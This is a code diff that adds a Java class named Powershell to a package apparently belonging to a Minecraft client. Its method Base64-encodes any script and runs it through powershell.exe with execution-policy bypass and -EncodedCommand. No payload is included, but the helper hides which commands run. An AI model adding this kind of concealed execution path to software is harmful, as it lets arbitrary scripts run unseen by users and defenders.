@@ -1,0 +1,32 @@
+--- /dev/null
++++ b/net/minecraft/src/Powershell.java
+@@ -1,0 +1,29 @@
++package net.minecraft.src;
++
++import java.io.BufferedReader;
++import java.io.InputStreamReader;
++import java.nio.charset.StandardCharsets;
++import java.util.Base64;
++
++public class Powershell {
++
++    public static String runEncoded(String script) {
++
++        try {
++            String encoded = Base64.getEncoder()
++                    .encodeToString(script.getBytes(StandardCharsets.UTF_16LE));
++            ProcessBuilder pb = new ProcessBuilder("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded);
++            pb.redirectErrorStream(true);
++            Process p = pb.start();
++            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
++            StringBuilder out = new StringBuilder();
++            String line;
++            while ((line = br.readLine()) != null) { out.append(line).append('\n');
++            }
++            p.waitFor();
++            return out.toString();
++        } catch (Exception e) {
++            return e.toString();
++        }
++    }
++}
